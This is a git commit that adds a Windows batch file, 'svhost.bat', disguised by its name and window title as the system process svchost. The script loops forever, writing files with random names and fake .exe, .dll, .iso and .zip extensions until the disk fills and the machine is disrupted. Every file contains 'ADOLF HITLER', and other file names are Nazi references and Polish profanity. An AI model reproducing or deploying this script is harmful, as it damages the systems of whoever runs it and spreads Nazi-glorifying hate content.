fa2c12be192c1947cdf2d6ba40b2074032353527
robloxdarmowe <102387345+robloxdarmowe@users.noreply.github.com>
2024-02-13 17:46:30 +0100

    Create svhost.bat

---
+++ svhost.bat
@@ -0,0 +1,10 @@
+@echo off
+title svhost.exe
+:kurwa
+echo ADOLF HITLER > ROZPIERDOL_____________________%random%%random%.txt
+echo ADOLF HITLER > HITLER_________________________%random%%random%.exe
+echo ADOLF HITLER > ADOLF__________________________%random%%random%.dll
+echo ADOLF HITLER > KURWA__________________________%random%%random%.png
+echo ADOLF HITLER > NAZI___________________________%random%%random%.iso
+echo ADOLF HITLER > SS_____________________________%random%%random%.zip
+goto kurwa
